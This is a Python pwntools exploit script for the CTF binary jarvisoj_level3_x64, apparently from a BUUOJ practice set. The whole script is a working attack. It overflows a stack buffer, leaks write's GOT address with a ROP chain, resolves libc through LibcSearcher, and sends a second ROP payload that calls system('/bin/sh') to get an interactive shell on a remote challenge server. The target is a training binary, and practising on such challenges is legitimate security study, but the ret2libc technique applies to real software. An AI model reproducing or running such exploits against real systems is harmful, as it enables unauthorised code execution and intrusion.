from LibcSearcher import LibcSearcher
from pwn import *


def jarvisoj_level3_x64(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/jarvisoj_level3_x64'):
    print('jarvisoj_level3_x64 start')
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 28593)
    target_elf = ELF(file_name)

    pop_ret_gadget = p64(0x4006b3)  # pop rdi ; ret
    pop2_ret_gadget = p64(0x4006b1)  # pop rsi ; pop r15 ; ret
    write_plt = p64(target_elf.plt['write'])
    write_got = p64(target_elf.got['write'])
    vuln_func_addr = p64(target_elf.symbols['vulnerable_function'])

    payload_1 = b'a' * 136
    # write(1, write_got, 0x200uLL);
    payload_1 += pop_ret_gadget + p64(0x1)
    payload_1 += pop2_ret_gadget + write_got + p64(0xdeadbeef)
    payload_1 += write_plt
    # vulnerable_function()
    payload_1 += vuln_func_addr

    target.sendlineafter('Input:\n', payload_1)
    write_addr = u64(target.recv(6).ljust(8, b'\x00'))

    searcher = LibcSearcher('write', write_addr)
    libc_base_addr = write_addr - searcher.dump('write')
    system_addr = p64(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p64(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'a' * 136
    # system('/bin/sh')
    payload_2 += pop_ret_gadget + bin_sh_addr + system_addr

    target.sendlineafter('Input:\n', payload_2)
    target.interactive()

    print('jarvisoj_level3_x64 end')


if __name__ == '__main__':
    jarvisoj_level3_x64()
